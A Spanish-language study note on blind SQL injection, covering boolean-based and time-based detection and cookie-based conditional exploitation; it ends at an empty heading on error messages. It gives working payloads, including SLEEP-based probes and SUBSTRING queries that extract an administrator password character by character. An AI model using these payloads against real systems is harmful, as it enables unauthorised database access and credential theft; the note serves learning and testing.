# 06/02/2025
# Blind SQL injection
Tipo de [SQLI](sql_injection.md) en el que la aplicacion es vulnerable a algun ataque pero la respuesta HTTP 
no lo muestra directamente sino que con cambios sutiles en la pagina o errores simples q no dicen nada, 
esto nos obliga a tener que generar payloads mas especificos.
**La estrategia generalmente es conseguir data sensible muy de a poco con herramientas automatizadas**
El payload depende mucho del tipo de respuesta que recibimos, esta puede ser una respuesta condicional
o algun tipo de mensaje de error. 

# Tipos principales
## Boolean-based
Se arma un payload que deberia devolver falso, esperas a ver la respuesta y despues injectas otro q devuelva verdaderos.
si las 2 request devuelven lo q esperabas la pagina es vulnerable a SQLI.

> Si la pagina nos muestra un item dado su id el query podria verse algo asi:


```
SELECT title, description, body FROM items WHERE ID = 2
```

> Nosotros podriamos agregar este payload en el id para que nos devuelva FALSE:

```
2 AND 1=2
```

> Esto deberia devolver FALSE casi siempre, ahora para verificar que tenemos una vulnerabilidad tendriamos que testear por TRUE:


```
2 AND 1=1
```

> Si esto devuelve TRUE entonces encontramos un SQLI


## Time-based 
Utiliza funciones de SQL que crean algun tipo de delay en la respuesta y dependiendo del tiempo que tarda en responder.

> El mismo caso que el anterior ejemplo

```
SELECT title, description, body FROM items WHERE ID = 2
```

> Ahora tendriamos que agregar una funcion de delay en el payload para verificar que funciona

```
2-SLEEP(15)
```

> Si nos hace esperar entonces existe alguna vulnerabilidad y podemos sacar mas info, como por ejemplo si la version de SQL es 5.x:

```
1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
```

# Tipos de respuesta y que hacer en cada caso
## Respuesta condicional
Ponele que tenes una pagina web que usa una cookie de trackeo. En el header esto se veria asi `Cookie: TrackingId=u5YD3PapBcR4`.
Cuando esta va al servidor el query que utiliza la applicacion es `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4`
Esto es vulnerable como ya sabemos, el unico problema aca es que la respuesta nosotros no la vemos pero lo que si podemos ver es el cambio 
en la pagina cuando entramos a esta con esa cookie, en este caso podria ser un "Bienvenido".

> Para testear si aca hay una injeccion hacemos

`xyz' OR '1'='1'--` -> Si no sabemos la cookie

`xyz' AND '1'='1` -> Si la conocemos (xyz lo remplazamos con el trackingid)

> Ahora que sabemos si hay una injeccion podemos intentar un ataque de fuerza bruta para determinar la contraseña del "administrador"

`xyz' OR SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--` -> ¿Es el primer caracter mayor a m? 

`xyz' OR SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) = 'x'--` -> ¿Es el segundo caracter x? 

## Mensaje de Error

